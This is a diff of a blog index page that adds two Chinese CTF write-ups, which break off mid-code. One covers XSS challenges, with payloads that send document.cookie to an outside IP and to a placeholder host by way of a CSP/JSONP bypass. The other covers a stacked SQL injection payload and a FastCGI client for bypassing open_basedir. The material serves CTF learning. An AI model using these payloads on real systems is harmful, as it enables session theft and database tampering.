@@ -90,6 +90,574 @@
     
         <article class="post">
             <h1>
+                <a class="title" href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/"> 
+                    RealWorld CTF2019 两道XSS-Web题解 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-09-24   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="RealWorld-CTF2019-两道XSS-Web题解"><a href="#RealWorld-CTF2019-两道XSS-Web题解" class="headerlink" title="RealWorld CTF2019 两道XSS-Web题解"></a>RealWorld CTF2019 两道XSS-Web题解</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186707" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186707</a></p>
+<h2 id="Mission-Invisible"><a href="#Mission-Invisible" class="headerlink" title="Mission Invisible"></a>Mission Invisible</h2><p>题目上来把代码全部给出来了，一段js并且告诉我们有两个隐藏的点</p>
+<pre><code>&lt;script&gt;
+    var getUrlParam = function (name) {
+        var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;);
+        var r = unescape(window.location.search.substr(1)).match(reg);
+        if (r != null) return r[2];
+        return null;
+    }
+
+    function setCookie(name, value) {
+        var Days = 30;
+        var exp = new Date();
+        exp.setTime(exp.getTime() + Days * 24 * 60 * 60 * 30);
+        document.cookie = name + &quot;=&quot; + value + &quot;;expires=&quot; + exp.toGMTString();
+    }
+
+    function getCookie(name) {
+        var search = name + &quot;=&quot;
+        var offset = document.cookie.indexOf(search)
+        if (offset != -1) {
+            offset += search.length;
+            var end = document.cookie.indexOf(&quot;;&quot;, offset);
+            if (end == -1) {
+                end = document.cookie.length;
+            }
+            return unescape(document.cookie.substring(offset, end));
+        }
+        else return &quot;&quot;;
+    }
+
+    function setElement(tag) {
+        tag = tag.substring(0, 1);
+        var ele = document.createElement(tag)
+        var attrs = getCookie(&quot;attrs&quot;).split(&quot;&amp;&quot;);
+        for (var i = 0; i &lt; attrs.length; i++) {
+            var key = attrs[i].split(&quot;=&quot;)[0];
+            var value = attrs[i].split(&quot;=&quot;)[1];
+            ele.setAttribute(key, value);
+        }
+        document.body.appendChild(ele);
+    }
+
+    var tag = getUrlParam(&quot;tag&quot;);
+    setCookie(&quot;tag&quot;, tag);
+    setElement(tag);
+
+&lt;/script&gt;</code></pre><p>重点在这个<code>setElement</code>函数，通过tag.substring(0, 1)创建一个dom事件，然后从cookie种取出attrs属性进行标签属性的赋值。接下来追一下cookie是怎么入库的</p>
+<pre><code>var tag = getUrlParam(&quot;tag&quot;);
+setCookie(&quot;tag&quot;, tag);</code></pre><p>追到函数不难发现是tag传参进去的，并且在<code>getcookie</code>函数中只截取了”attrs=”的后面的值，那么我们就可以在value里插入attrs的值。</p>
+<p><img src="http://static.zybuluo.com/1160307775/8nnawoe6cckqbj8v45i7u28p/image_1dksu3lma1sdcaodk0j19g11tn213.png" alt="image_1dksu3lma1sdcaodk0j19g11tn213.png-115.9kB"></p>
+<p>所以现在的难点就在于怎么构造一个标签，在浏览器解析的时候自动触发XSS。由于<code>tag = tag.substring(0, 1);</code>这段代码，使得我们现在能用的标签只有a、p。</p>
+<p>最初我的想法是污染原型链，在循环遍历attrs的时候：</p>
+<pre><code>第一次key = __proto__.ele  &amp; value = document.createElement(“script”)
+
+第二次 key = src  &amp; value = evil.com</code></pre><p>但是尝试了一下发现这样并不能够成功污染，因为我们已经定义了ele这个变量。那只能从a、p标签下手，这里@LFY师傅想到一个很好的方法</p>
+<p><img src="http://static.zybuluo.com/1160307775/qxend2mls2etcgiz0das8h9z/image_1dksuhiqvuci17tssl8o111eh720.png" alt="image_1dksuhiqvuci17tssl8o111eh720.png-97.5kB"></p>
+<pre><code>&lt;p onfocus=&quot;alert(document.cookie)&quot; id=&quot;1&quot; tabindex=&quot;0&quot;&gt;&lt;/p&gt;</code></pre><p>我们可以通过tableindex使标签可聚焦，只需要在url后面跟一个锚点指向标签id，类似于<code>#1</code>，这样聚焦时触发onfocus，效果就等效于自动触发xss。</p>
+<pre><code>http://52.52.236.217:16401/?tag=a%3d1attrs%3donmouserover%3d1%2526onfocus%3dalert(1)%2526id%3d1%2526tabindex%3d0#1</code></pre><p><img src="http://static.zybuluo.com/1160307775/guipvs8t8hxfv0rxvm7hvjse/image_1dksundi8iu3lrfhnnpkunra2d.png" alt="image_1dksundi8iu3lrfhnnpkunra2d.png-249.6kB"></p>
+<p>接着就是常规打cookie到本地</p>
+<pre><code>http://52.52.236.217:16401/?tag=a=attrs=onmouseover=1%2526onfocus=eval(String.fromCharCode(119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,61,39,104,116,116,112,58,47,47,49,51,57,46,49,57,57,46,50,48,51,46,50,53,51,58,49,50,51,52,47,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101))%2526id=1%2526tabindex=0#1</code></pre><h2 id="Hcorme"><a href="#Hcorme" class="headerlink" title="Hcorme"></a>Hcorme</h2><h3 id="题目说明"><a href="#题目说明" class="headerlink" title="题目说明"></a>题目说明</h3><p>首先题目有一个callback的接口，能够把请求参数输出，并且是text/html形式。这点其实在日常的web应用种并不多见，大多数callback的mime都是javascript</p>
+<p><img src="http://static.zybuluo.com/1160307775/ieklsfj1adpr8wcyfwcp6k29/image_1dkseq56a1q3f111911ftas01les9.png" alt="image_1dkseq56a1q3f111911ftas01les9.png-111.3kB"></p>
+<p>于此同时题目有两个难点需要bypass：</p>
+<ul>
+<li>XSS Auditor的限制<br><img src="http://static.zybuluo.com/1160307775/i0q4o5jr15jip56ufv4qbx5b/image_1dksf8oneelujp2n651k3a1qbu13.png" alt="image_1dksf8oneelujp2n651k3a1qbu13.png-183.7kB"></li>
+</ul>
+<ul>
+<li>CSP的限制<pre><code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;; base-uri &#39;none&#39;;</code></pre></li>
+</ul>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>先着眼xss auditor这个点，在Chrome78以后XSS-Auditor被Chrome自家砍掉了，虽然auditor曾是不少xsser在面对反射性XSS时候的难题，但随着bypass的方法也日益增多，auditor的弊远远大于利：因为auditor在触发的时候会删除恶意输入，之前我博客中有一篇文章<a href="https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/">前端全局变量劫持</a>，就能够利用Auditor达到变量劫持的目的。</p>
+<p>于此同时Bypass auditor也算是出题人给我们的Hint。</p>
+<p>当时我的思路是用字符集去bypass，也就是下面这种思路<br><img src="http://static.zybuluo.com/1160307775/urr4wey9p4wqrnt88qknu6el/image_1dksffho3ttit161ctftckbo61g.png" alt="image_1dksffho3ttit161ctftckbo61g.png-62.5kB"></p>
+<p>因为auditor的核心思路就是拿浏览器的渲染和我们的输入做比较，不相符则不会被Check。不过chrome77已经不存在iso-2022-jp这种绕过的方法。接下来我们看一下Hardold师傅的思路–&gt;<strong>utf-16编码绕过</strong></p>
+<p>这里串一个编码的知识点，通常我们看到%xx%xx这类的url编码，其实是用16进制表示的，比如utf-8编码形式如下</p>
+<pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote
+&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-8&#39;)))
+&gt;&gt;&gt; %E7%8C%AA</code></pre><p>那么”猪”这个字在utf-8编码下就是<code>0xe7 0x8c 0xaa</code>，下面我们来看一下utf-16编码下的”猪”怎么表示</p>
+<pre><code>&gt;&gt;&gt; from urllib.parse import quote,unquote
+&gt;&gt;&gt; print(quote((&#39;猪&#39;).encode(&#39;utf-16&#39;)))
+&gt;&gt;&gt; %FF%FE%2As</code></pre><p>这时会发现，用utf-16无论编码什么字符，前两个字节都是``0xff0xfe`<br><img src="http://static.zybuluo.com/1160307775/hw1p5epypji3hs4ceofrjada/image_1dksl9ssig0pv2l1f171qr31c5q1t.png" alt="image_1dksl9ssig0pv2l1f171qr31c5q1t.png-98.4kB"></p>
+<p>因为在UTF-16文件的开首，都会放置一个U+FEFF字符作为Byte Order Mark（UTF-16LE以FF FE代表，UTF-16BE以FE FF代表），以显示这个文本文件是以UTF-16编码，它是个没有宽度也没有断字的空白。</p>
+<p>此时我们来尝试一下能否Bypass XSS Auditor</p>
+<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))
+
+%FF%FE%3C%00s%00c%00r%00i%00p%00t%00%3E%00a%00l%00e%00r%00t%00%28%001%00%29%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p><img src="http://static.zybuluo.com/1160307775/wosh7er7qz9zoevz5m9lv3tx/image_1dksm95e81qka1ts9meii2m1cd92q.png" alt="image_1dksm95e81qka1ts9meii2m1cd92q.png-227.5kB"></p>
+<p>成功插入标签，接下来到了第二步，Bypass CSP。因为锁了default-src又没有给unsafe-inline，但是题目有一个jsonp的点，不难想到今年的那道<a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">ins’hack 2019/的bypasses-everywhere</a></p>
+<p>这篇文章的大意相当于利用jsonp直接把js代码”挂载”到本地的script标签里面，从而导致的bypass。那么我们编写一个demo看看</p>
+<pre><code>&gt;&gt;&gt; print(quote((&#39;&lt;script/src=?callback=alert(1)&gt;&lt;/script&gt;&#39;).encode(&#39;utf-16&#39;)))
+
+%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00a%00l%00e%00r%00t%00%28%001%00%29%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><p>可以看到进行了两次资源请求，第二次的资源的执行类型是script<br><img src="http://static.zybuluo.com/1160307775/jo3855qgvjiy2kl23v5m050f/image_1dkssc09a13h01mnh8561rft1g0u9.png" alt="image_1dkssc09a13h01mnh8561rft1g0u9.png-154.8kB"></p>
+<p>接着就是把flag打到自己的本地就行了</p>
+<pre><code>&gt;&gt;&gt; print(quote((&quot;&lt;script/src=?callback=window.location=&#39;http://xxx/?&#39;%2bdocument.cookie%0a//&gt;&lt;/script&gt;&quot;).encode(&#39;utf-16&#39;)))
+
+%FF%FE%3C%00s%00c%00r%00i%00p%00t%00/%00s%00r%00c%00%3D%00%3F%00c%00a%00l%00l%00b%00a%00c%00k%00%3D%00w%00i%00n%00d%00o%00w%00.%00l%00o%00c%00a%00t%00i%00o%00n%00%3D%00%27%00h%00t%00t%00p%00%3A%00/%00/%00x%00x%00x%00/%00%3F%00%27%00%25%002%00b%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e%00%25%000%00a%00/%00/%00%3E%00%3C%00/%00s%00c%00r%00i%00p%00t%00%3E%00</code></pre><h2 id="比赛总结"><a href="#比赛总结" class="headerlink" title="比赛总结"></a>比赛总结</h2><p>赛题质量真心高，膜Harlold师傅，日常拿0day打比赛..orz</p>
+
+                
+            </div>
+            <div class="continue">
+            <a href="/2019/09/24/RealWorld CTF2019 两道XSS-Web题解/">
+            继续阅读            <i class="fa fa-angle-right" aria-hidden="true"></i>
+            </a>
+            </div>
+        </article>
+        
+        <article class="post">
+            <h1>
+                <a class="title" href="/2019/09/17/从一道CTF学习Fastcgi绕过姿势/"> 
+                    从一道CTF学习Fastcgi绕过姿势 
+                </a>
+            </h1>
+                        <div class="meta">
+                <a class="date"> 
+                    <i class="fa fa-calendar" aria-hidden="true"></i>                    
+                    2019-09-17   
+                </a>
+                
+                
+                
+                <a class="tag">
+                    <i class="fa fa-tags" aria-hidden="true"></i>  
+                </a>
+                
+                    <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li></ul>
+            </div>
+            <div class="content">
+                
+                <h1 id="从一道CTF学习Fastcgi绕过姿势"><a href="#从一道CTF学习Fastcgi绕过姿势" class="headerlink" title="从一道CTF学习Fastcgi绕过姿势"></a>从一道CTF学习Fastcgi绕过姿势</h1><p>原文首发于安全客:<a href="https://www.anquanke.com/post/id/186186" target="_blank" rel="noopener">https://www.anquanke.com/post/id/186186</a></p>
+<p>周末做了一个字节跳动的CTF比赛，其中blog这道题涉及到了disable_functions和open_basedir的限制。在0CTF中出现了类似的考法，给了命令执行点去Bypass Disable_functions&amp;Open_basedir，以前没有做过相关的题，这次记录一下思路和用到的脚本。</p>
+<p>关于0CTF的题解，参考飘零师傅：<a href="https://www.anquanke.com/post/id/175403" target="_blank" rel="noopener">深入浅出LD_PRELOAD &amp; putenv()</a></p>
+<h2 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h2><p>当然这题不像0ctf上来就给了你命令执行点，要挖掘一下。简单记一下wp，这部分不细讲。首先是给了全部的源码，在replace.php页面有一个重要功能</p>
+<p><img src="http://static.zybuluo.com/1160307775/zojwvlchmoeamdiicqepfg7n/image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png" alt="image_1dkak4ebeg8a1e23145e1sbk1pgi3j.png-429.4kB"></p>
+<p>题目的PHP环境是5.3.3所以<code>preg_replace</code>函数是存在一个代码执行的，正好参数又是可控，$replace部分将会被当作php代码执行。</p>
+<p>只不过需要先从库里执行这样一句话:<code>$sql-&gt;query(&quot;select isvip from users where id=&quot; . $_SESSION[&#39;id&#39;] . &quot;;&quot;)</code>取校验是否isvip==1，默认注册的所有用户isvip==0。</p>
+<p>通过某种方式改变自己的<code>isvip</code>字段，看了下config.php出题人还上了一个waf，直接注入基本不可能。但是它没有过滤SET这个关键词，而且PDO在php5.3以后是支持多条查询的，这给我们堆叠注入创造了机会。<br><img src="http://static.zybuluo.com/1160307775/6cr621hta58y7gic89n0acyf/image_1dkakdh2q164i1hfok7m12koug44g.png" alt="image_1dkakdh2q164i1hfok7m12koug44g.png-440.4kB"></p>
+<p>在<code>edit.php</code>有一个很典型的二次注入，太长时间没接触一时没看出来。虽然$title在第一次入库时是经过了addslashes，但是在mysql存储的时候并不会加入<code>\</code>，导致<code>edit.php</code>页面引入之前存储的title字段产生成二次注入。<br><img src="http://static.zybuluo.com/1160307775/eiuxvnfo96iboan9shzwvql4/image_1dkakhsvmfcsqck1pkabm5dgj4t.png" alt="image_1dkakhsvmfcsqck1pkabm5dgj4t.png-405.6kB"></p>
+<p>直接贴payload，注入语句用16进制代替在@SQL中了，这种绕过思路在强网杯的题目上也有用到。也可以用concat()+16进制单字符绕。</p>
+<pre><code>hpdoger&#39;;SET @SQL=0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227;PREPARE pord FROM @SQL;EXECUTE pord;# 
+
+0x555044415445207573657273205345542069737669703d3120574845524520757365726e616d653d276870646f67657227
+=&gt;
+UPDATE users SET isvip=1 WHERE username=&#39;hpdoger&#39;</code></pre><p>isvip==1就能代码执行了，phpinfo()看了一下，有disable_funcions和open_basedir的限制，而且过滤跟0CTF那道题很相似，但是没有安装Imagick拓展<br><img src="http://static.zybuluo.com/1160307775/7u4yy60zxzdd21m1tsqdrk2i/image_1dkakvbks1m3dlh01vaarvb17l85n.png" alt="image_1dkakvbks1m3dlh01vaarvb17l85n.png-266.2kB"></p>
+<pre><code>pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,dl,mail</code></pre><h2 id="什么是FastCGI和FPM"><a href="#什么是FastCGI和FPM" class="headerlink" title="什么是FastCGI和FPM"></a>什么是FastCGI和FPM</h2><p>举个例子，如果我们请求index.php，根据配置文件，Web Server知道这个不是静态文件，需要去找 PHP 解析器来处理，那么他会把这个请求简单处理，然后交给PHP解析器。Web Server 一般指Apache、Nginx、IIS、Lighttpd、Tomcat等服务器<br><img src="http://static.zybuluo.com/1160307775/69lriwpxmlxmybbhn5u7a0we/image_1dkah71fj1l9u4mu2gfsd2q6d9.png" alt="image_1dkah71fj1l9u4mu2gfsd2q6d9.png-61.5kB"></p>
+<h3 id="CGI-amp-FastCGI"><a href="#CGI-amp-FastCGI" class="headerlink" title="CGI&amp;FastCGI"></a>CGI&amp;FastCGI</h3><p>CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具。WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。</p>
+<p>FastCGI是用来提高CGI程序性能的。类似于CGI，<strong>FastCGI也可以说是一种协议</strong>。简单来说就是CGI的优化：对于CGI来说，每一个Web请求PHP都必须重新解析php.ini、重新载入全部扩展，并重新初始化全部数据结构。而使用FastCGI，所有这些都只在进程启动时发生一次。还有一个额外的好处是，持续数据库连接(Persistent database connection)可以工作。</p>
+<p>FastCGI的工作原理如下：<br><img src="http://static.zybuluo.com/1160307775/9a80mehqfymaajjef8zfagch/image_1dkahc1jogup1l5v1dlr9qe1c1n26.png" alt="image_1dkahc1jogup1l5v1dlr9qe1c1n26.png-88.7kB"></p>
+<p>1、Web Server启动时载入FastCGI进程管理器（Apache Module或IIS ISAPI等)</p>
+<p>2、FastCGI进程管理器自身初始化，启动多个CGI解释器进程(可建多个php-cgi)，并等待来自Web Server的连接。</p>
+<p>3、当客户端请求到达Web Server时，FastCGI进程管理器选择并连接到一个CGI解释器。Web server将CGI环境变量和标准输入发送到FastCGI子进程php-cgi。</p>
+<p>4、FastCGI子进程完成处理后，将标准输出和错误信息从同一连接返回Web Server。当FastCGI子进程关闭连接时，请求便告处理完成。FastCGI子进程接着等待，并处理来自FastCGI进程管理器(运行在Web Server中)的下一个连接。 在CGI模式中，php-cgi在此便退出了。</p>
+<h3 id="PHP-FPM"><a href="#PHP-FPM" class="headerlink" title="PHP-FPM"></a>PHP-FPM</h3><p>FPM(php-fastcgi program manager)顾名思义，这是一个PHP专用的 fastcgi 管理器。也就是说，PHP-FPM 是对于 FastCGI 协议的具体实现，他负责管理一个进程池，来处理来自Web服务器的请求。目前，PHP5.3版本之后，PHP-FPM是内置于PHP的。因为PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理。所以就出现了一些能够调度 php-cgi 进程的程序，比如说由lighthttpd分离出来的spawn-fcgi。同样，PHP-FPM也是用于调度管理PHP解析器php-cgi的管理程序。</p>
+<h2 id="open-basedir的绕过"><a href="#open-basedir的绕过" class="headerlink" title="open_basedir的绕过"></a>open_basedir的绕过</h2><p>前提是我们能够执行一段php程序来伪造FastCGI.php</p>
+<p>在PHP中：</p>
+<ul>
+<li><p>可以通过在FastCGI协议修改PHP_VALUE字段进而修改php.ini中的一些设置，而open_basedir 同样可以通过此种方法进行设置。比如：<code>$php_value = &quot;open_basedir = /&quot;;</code></p>
+</li>
+<li><p>因为FPM没有判断请求的来源是否必须来自Webserver。根据PHP解析器的流程，我们可以伪造FastCGI向FPM发起请求，PHP_VALUE相当于改变.ini中的设置，覆盖了本身的open_basedir</p>
+</li>
+</ul>
+<h3 id="FastCGI脚本"><a href="#FastCGI脚本" class="headerlink" title="FastCGI脚本"></a>FastCGI脚本</h3><pre><code>&lt;?php
+class TimedOutException extends \Exception {
+}
+class ForbiddenException extends \Exception {
+}
+class Client {
+const VERSION_1 = 1;
+const BEGIN_REQUEST = 1;
+const ABORT_REQUEST = 2;
+const END_REQUEST = 3;
+const PARAMS = 4;
+const STDIN = 5;
+const STDOUT = 6;
+const STDERR = 7;
+const DATA = 8;
+const GET_VALUES = 9;
+const GET_VALUES_RESULT = 10;
+const UNKNOWN_TYPE = 11;
+const MAXTYPE = self::UNKNOWN_TYPE;
+const RESPONDER = 1;
+const AUTHORIZER = 2;
+const FILTER = 3;
+const REQUEST_COMPLETE = 0;
+const CANT_MPX_CONN = 1;
+const OVERLOADED = 2;
+const UNKNOWN_ROLE = 3;
+const MAX_CONNS = &#39;MAX_CONNS&#39;;
+const MAX_REQS = &#39;MAX_REQS&#39;;
+const MPXS_CONNS = &#39;MPXS_CONNS&#39;;
+const HEADER_LEN = 8;
+const REQ_STATE_WRITTEN = 1;
+const REQ_STATE_OK = 2;
+const REQ_STATE_ERR = 3;
+const REQ_STATE_TIMED_OUT = 4;
+private $_sock = null;
+private $_host = null;
+private $_port = null;
+private $_keepAlive = false;
+private $_requests = array();
+private $_persistentSocket = false;
+private $_connectTimeout = 5000;
+private $_readWriteTimeout = 5000;
+public function __construct( $host, $port ) {
+    $this-&gt;_host = $host;
+    $this-&gt;_port = $port;
+}
+public function setKeepAlive( $b ) {
+          $this-&gt;_keepAlive = (boolean) $b;
+          if ( ! $this-&gt;_keepAlive &amp;&amp; $this-&gt;_sock ) {
+              fclose( $this-&gt;_sock );
+    }
+}
+public function getKeepAlive() {
+    return $this-&gt;_keepAlive;
+}
+public function setPersistentSocket( $b ) {
+          $was_persistent          = ( $this-&gt;_sock &amp;&amp; $this-&gt;_persistentSocket );
+          $this-&gt;_persistentSocket = (boolean) $b;
+          if ( ! $this-&gt;_persistentSocket &amp;&amp; $was_persistent ) {
+              fclose( $this-&gt;_sock );
+    }
+}
+public function getPersistentSocket() {
+    return $this-&gt;_persistentSocket;
+}
+public function setConnectTimeout( $timeoutMs ) {
+          $this-&gt;_connectTimeout = $timeoutMs;
+}
+public function getConnectTimeout() {
+    return $this-&gt;_connectTimeout;
+}
+public function setReadWriteTimeout( $timeoutMs ) {
+          $this-&gt;_readWriteTimeout = $timeoutMs;
+          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );
+}
+public function getReadWriteTimeout() {
+    return $this-&gt;_readWriteTimeout;
+}
+private function set_ms_timeout( $timeoutMs ) {
+          if ( ! $this-&gt;_sock ) {
+        return false;
+    }
+    return stream_set_timeout( $this-&gt;_sock, floor( $timeoutMs / 1000 ), ( $timeoutMs % 1000 ) * 1000 );
+}
+private function connect() {
+    if ( ! $this-&gt;_sock ) {
+              if ( $this-&gt;_persistentSocket ) {
+                  $this-&gt;_sock = pfsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
+              } else {
+                  $this-&gt;_sock = fsockopen( $this-&gt;_host, $this-&gt;_port, $errno, $errstr, $this-&gt;_connectTimeout / 1000 );
+              }
+              if ( ! $this-&gt;_sock ) {
+                  throw new \Exception( &#39;Unable to connect to FastCGI application: &#39; . $errstr );
+              }
+              if ( ! $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout ) ) {
+            throw new \Exception( &#39;Unable to set timeout on socket&#39; );
+        }
+    }
+}
+private function buildPacket( $type, $content, $requestId = 1 ) {
+          $clen = strlen( $content );
+    return chr( self::VERSION_1 )         /* version */
+           . chr( $type )                    /* type */
+                 . chr( ( $requestId &gt;&gt; 8 ) &amp; 0xFF ) /* requestIdB1 */
+           . chr( $requestId &amp; 0xFF )        /* requestIdB0 */
+                 . chr( ( $clen &gt;&gt; 8 ) &amp; 0xFF )     /* contentLengthB1 */
+           . chr( $clen &amp; 0xFF )             /* contentLengthB0 */
+                 . chr( 0 )                        /* paddingLength */
+                 . chr( 0 )                        /* reserved */
+                 . $content;                     /* content */
+}
+private function buildNvpair( $name, $value ) {
+    $nlen = strlen( $name );
+    $vlen = strlen( $value );
+    if ( $nlen &lt; 128 ) {
+              /* nameLengthB0 */
+              $nvpair = chr( $nlen );
+          } else {
+              /* nameLengthB3 &amp; nameLengthB2 &amp; nameLengthB1 &amp; nameLengthB0 */
+              $nvpair = chr( ( $nlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $nlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $nlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $nlen &amp; 0xFF );
+          }
+          if ( $vlen &lt; 128 ) {
+        /* valueLengthB0 */
+        $nvpair .= chr( $vlen );
+    } else {
+        /* valueLengthB3 &amp; valueLengthB2 &amp; valueLengthB1 &amp; valueLengthB0 */
+        $nvpair .= chr( ( $vlen &gt;&gt; 24 ) | 0x80 ) . chr( ( $vlen &gt;&gt; 16 ) &amp; 0xFF ) . chr( ( $vlen &gt;&gt; 8 ) &amp; 0xFF ) . chr( $vlen &amp; 0xFF );
+    }
+    /* nameData &amp; valueData */
+    return $nvpair . $name . $value;
+}
+private function readNvpair( $data, $length = null ) {
+    $array = array();
+          if ( $length === null ) {
+        $length = strlen( $data );
+    }
+    $p = 0;
+          while ( $p != $length ) {
+              $nlen = ord( $data{$p ++} );
+              if ( $nlen &gt;= 128 ) {
+                  $nlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
+                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
+                  $nlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
+                  $nlen |= ( ord( $data{$p ++} ) );
+              }
+              $vlen = ord( $data{$p ++} );
+              if ( $vlen &gt;= 128 ) {
+                  $vlen = ( $nlen &amp; 0x7F &lt;&lt; 24 );
+                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 16 );
+                  $vlen |= ( ord( $data{$p ++} ) &lt;&lt; 8 );
+                  $vlen |= ( ord( $data{$p ++} ) );
+              }
+              $array[ substr( $data, $p, $nlen ) ] = substr( $data, $p + $nlen, $vlen );
+              $p                                   += ( $nlen + $vlen );
+    }
+    return $array;
+}
+private function decodePacketHeader( $data ) {
+          $ret                  = array();
+          $ret[&#39;version&#39;]       = ord( $data{0} );
+          $ret[&#39;type&#39;]          = ord( $data{1} );
+          $ret[&#39;requestId&#39;]     = ( ord( $data{2} ) &lt;&lt; 8 ) + ord( $data{3} );
+          $ret[&#39;contentLength&#39;] = ( ord( $data{4} ) &lt;&lt; 8 ) + ord( $data{5} );
+          $ret[&#39;paddingLength&#39;] = ord( $data{6} );
+          $ret[&#39;reserved&#39;]      = ord( $data{7} );
+    return $ret;
+}
+private function readPacket() {
+    if ( $packet = fread( $this-&gt;_sock, self::HEADER_LEN ) ) {
+        $resp            = $this-&gt;decodePacketHeader( $packet );
+              $resp[&#39;content&#39;] = &#39;&#39;;
+        if ( $resp[&#39;contentLength&#39;] ) {
+                  $len = $resp[&#39;contentLength&#39;];
+                  while ( $len &amp;&amp; ( $buf = fread( $this-&gt;_sock, $len ) ) !== false ) {
+                      $len             -= strlen( $buf );
+                      $resp[&#39;content&#39;] .= $buf;
+                  }
+              }
+              if ( $resp[&#39;paddingLength&#39;] ) {
+            $buf = fread( $this-&gt;_sock, $resp[&#39;paddingLength&#39;] );
+        }
+        return $resp;
+    } else {
+        return false;
+    }
+}
+public function getValues( array $requestedInfo ) {
+          $this-&gt;connect();
+          $request = &#39;&#39;;
+          foreach ( $requestedInfo as $info ) {
+              $request .= $this-&gt;buildNvpair( $info, &#39;&#39; );
+          }
+          fwrite( $this-&gt;_sock, $this-&gt;buildPacket( self::GET_VALUES, $request, 0 ) );
+          $resp = $this-&gt;readPacket();
+          if ( $resp[&#39;type&#39;] == self::GET_VALUES_RESULT ) {
+              return $this-&gt;readNvpair( $resp[&#39;content&#39;], $resp[&#39;length&#39;] );
+    } else {
+        throw new \Exception( &#39;Unexpected response type, expecting GET_VALUES_RESULT&#39; );
+    }
+}
+public function request( array $params, $stdin ) {
+    $id = $this-&gt;async_request( $params, $stdin );
+    return $this-&gt;wait_for_response( $id );
+}
+public function async_request( array $params, $stdin ) {
+    $this-&gt;connect();
+          // Pick random number between 1 and max 16 bit unsigned int 65535
+          $id = mt_rand( 1, ( 1 &lt;&lt; 16 ) - 1 );
+    // Using persistent sockets implies you want them keept alive by server!
+    $keepAlive     = intval( $this-&gt;_keepAlive || $this-&gt;_persistentSocket );
+          $request       = $this-&gt;buildPacket( self::BEGIN_REQUEST
+              , chr( 0 ) . chr( self::RESPONDER ) . chr( $keepAlive ) . str_repeat( chr( 0 ), 5 )
+        , $id
+          );
+          $paramsRequest = &#39;&#39;;
+    foreach ( $params as $key =&gt; $value ) {
+              $paramsRequest .= $this-&gt;buildNvpair( $key, $value, $id );
+          }
+          if ( $paramsRequest ) {
+        $request .= $this-&gt;buildPacket( self::PARAMS, $paramsRequest, $id );
+    }
+    $request .= $this-&gt;buildPacket( self::PARAMS, &#39;&#39;, $id );
+          if ( $stdin ) {
+        $request .= $this-&gt;buildPacket( self::STDIN, $stdin, $id );
+    }
+    $request .= $this-&gt;buildPacket( self::STDIN, &#39;&#39;, $id );
+          if ( fwrite( $this-&gt;_sock, $request ) === false || fflush( $this-&gt;_sock ) === false ) {
+        $info = stream_get_meta_data( $this-&gt;_sock );
+        if ( $info[&#39;timed_out&#39;] ) {
+                  throw new TimedOutException( &#39;Write timed out&#39; );
+              }
+              // Broken pipe, tear down so future requests might succeed
+              fclose( $this-&gt;_sock );
+        throw new \Exception( &#39;Failed to write request to socket&#39; );
+    }
+    $this-&gt;_requests[ $id ] = array(
